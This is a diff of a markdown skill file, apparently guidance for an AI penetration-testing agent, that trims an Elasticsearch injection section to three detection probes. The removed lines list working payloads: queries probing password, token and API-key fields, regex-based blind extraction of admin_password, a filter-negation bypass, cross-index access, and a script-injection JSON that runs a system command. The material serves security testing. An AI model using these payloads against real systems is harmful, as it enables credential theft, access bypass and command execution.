@@ -228,46 +228,17 @@ CouchDB has a different attack surface than MongoDB. Test these if CouchDB is id
 
 ## Elasticsearch Testing
 
-Elasticsearch injection targets `query_string` and `simple_query_string` query types where user input reaches Lucene syntax parsing. Script injection (`painless`, `groovy`) is disabled by default since ES 5.x and rarely viable. The real surface is data extraction and access control bypass via search syntax.
+If Elasticsearch is identified (via Step 1 indicators), load the dedicated skill:
 
-For the full methodology, load `agent/skills/elasticsearch-injection/SKILL.md`.
+**→ `agent/skills/elasticsearch-injection/SKILL.md`** — full methodology for query_string injection, field enumeration, data extraction, cross-index access, and access control bypass.
 
-### Quick Detection
+**Quick gate check (3 probes to confirm ES injection surface exists):**
 
-- [ ] **Confirm query_string processing**: send `search=test AND 1=1` vs `search=test AND 1=2` — if result sets differ, boolean operators are parsed
-- [ ] **Wildcard test**: `search=*` returns more results than a specific term → Lucene syntax active
-- [ ] **Field-qualified probe**: `search=_exists_:password` → if results change, field queries work
+- [ ] `search=test AND 1=1` vs `search=test AND 1=2` — result sets differ → query_string confirmed
+- [ ] `search=*` — returns more results than specific term → Lucene syntax active
+- [ ] `search=_exists_:password` — results change → field-qualified queries work
 
-### Field Enumeration (highest-value attack)
-
-- [ ] **Lucene field query**: `search=password:*`, `search=api_key:*`, `search=secret:*`
-- [ ] **Existence check**: `search=_exists_:password`, `search=_exists_:token`
-- [ ] **Wildcard field names**: `search=pass*:*`, `search=*secret*:*`
-- [ ] **Source override**: `?search=test&_source=password,api_key,secret`
-
-### Data Extraction
-
-- [ ] **Regex extraction**: `search=password:/^a.*/` → binary search on characters
-- [ ] **Range queries**: `search=salary:[50000 TO 100000]`
-- [ ] **Boolean blind via count**: `search=admin_password:/^s.*/` → count changes confirm character
-
-### Access Control Bypass
-
-- [ ] **Negate app-injected filters**: `search=*) OR deleted:true OR (*:*`
-- [ ] **Cross-index**: `?search=*&index=_all` or `?index=credentials`
-
-### Direct API Access (rare but critical)
-
-- [ ] **Index enumeration**: `GET /_cat/indices?v` — list all indices
-- [ ] **Mapping disclosure**: `GET /_mapping` — field names and types for all indices
-- [ ] **Script injection** (requires `script.inline: true` — rare):
-  ```json
-  {"query": {"bool": {"must": [{"script": {"script": "java.lang.Runtime.getRuntime().exec('id')"}}]}}}
-  ```
-
-### Extended Reference
-
-Full payload library: `agent/references/payloads/elasticsearch-injection-payloads.md`
+If any gate fires, switch to the dedicated ES skill. Do not improvise ES testing from this skill.
 
 ---
 
